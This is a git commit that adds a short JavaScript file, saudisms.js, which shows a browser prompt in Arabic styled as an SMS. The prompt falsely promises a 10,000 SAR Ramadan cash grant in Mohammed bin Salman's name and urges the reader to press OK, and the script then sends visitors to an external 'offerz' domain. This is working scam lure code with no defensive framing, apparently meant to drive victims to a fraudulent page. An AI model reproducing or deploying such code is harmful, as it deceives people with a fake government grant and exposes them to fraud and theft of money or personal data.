f64418eeed10fe7eafb9c5c5b640f080e2ba27ff
bigetijazz19 <bigetijazz19@gmail.com>
2025-03-26 09:18:04 +0100

    Create saudisms.js

---
+++ saudisms.js
@@ -0,0 +1,6 @@
+
+var password = 'ينسحب SAR10,000'
+password=prompt('SMS: مبروك، أنت مؤهل للحصول على MOHAMMED BIN SALMAN SAR10,000 RAMADAN منحة نقدية للجميع، يرجى الضغط على موافق لسحب الجائزة النقدية','ينسحب SAR10,000');
+if (password != 'ينسحب SAR10,000') {
+location.href='https://www.ntegha-offerz.xyz/ramadan-SAR10000';
+}
